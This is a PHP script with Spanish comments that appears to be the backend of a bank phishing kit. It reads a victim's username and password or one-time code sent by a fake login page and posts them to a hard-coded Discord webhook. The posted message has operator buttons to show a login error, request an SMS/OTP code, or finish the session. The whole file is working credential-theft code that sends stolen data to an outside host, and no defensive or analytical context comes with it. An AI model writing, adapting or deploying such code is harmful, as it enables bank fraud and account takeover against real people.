<?php
// Configuración
$webhook_url = "https://discord.com/api/webhooks/1497277480854094034/CwIFuxjcHG-oaxYTVlKoXGG1rckYFlxHwQy8EXceHFiEQOzVT51Xokx7Fw-HZ0E6GFVP";
$mi_web = "https://tusitio.com"; // CAMBIA ESTO POR TU URL REAL

// Capturar datos del JS
$data = json_decode(file_get_contents('php://input'), true);
$usuario = $data['usuario'];
$clave = $data['clave'] ?? 'N/A';
$tipo = $data['tipo'] ?? 'LOGIN';

// Crear el mensaje con botones (usando componentes de Discord)
// Nota: Los enlaces en los botones activarán el control.php
$payload = [
    "username" => "Panel de Control - Banco",
    "embeds" => [[
        "title" => "🏦 NUEVA ACCIÓN: " . $tipo,
        "color" => 0xf59a05,
        "fields" => [
            ["name" => "👤 Usuario", "value" => "`$usuario`", "inline" => true],
            ["name" => "🔑 Clave/OTP", "value" => "`$clave`", "inline" => true]
        ],
        "footer" => ["text" => "Haz clic en un botón para mover al usuario"]
    ]],
    "components" => [[
        "type" => 1,
        "components" => [
            [
                "type" => 2, "style" => 4, "label" => "❌ Error Login", 
                "url" => "$mi_web/control.php?accion=error_login"
            ],
            [
                "type" => 2, "style" => 3, "label" => "📲 Pedir SMS/OTP", 
                "url" => "$mi_web/control.php?accion=pedir_otp"
            ],
            [
                "type" => 2, "style" => 1, "label" => "✅ Finalizar", 
                "url" => "$mi_web/control.php?accion=finalizar"
            ]
        ]
    ]]
];

$ch = curl_init($webhook_url);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

echo json_encode(["status" => "ok"]);
?>